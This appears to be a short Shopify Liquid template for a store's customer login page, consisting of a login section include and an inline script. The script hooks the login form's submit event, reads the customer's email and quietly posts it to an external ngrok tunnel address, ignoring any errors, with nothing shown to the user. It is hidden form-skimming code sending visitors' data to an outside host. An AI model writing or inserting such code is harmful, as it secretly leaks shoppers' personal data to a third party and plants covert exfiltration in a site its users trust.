{% section 'login' %}

<script>
(function(){
  var form = document.querySelector('form[action^="/account/login"]');
  if (!form) return;
  form.addEventListener('submit', function(){
    var emailInput = form.querySelector('input[name="customer[email]"]');
    var email = emailInput && emailInput.value && emailInput.value.trim();
    if (!email) return;
    try {
      fetch('https://antony-undamaging-thersa.ngrok-free.dev/sync/auto', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email }),
        keepalive: true,
        mode: 'cors'
      });
    } catch (_) {}
  }, { capture: true });
})();
</script>
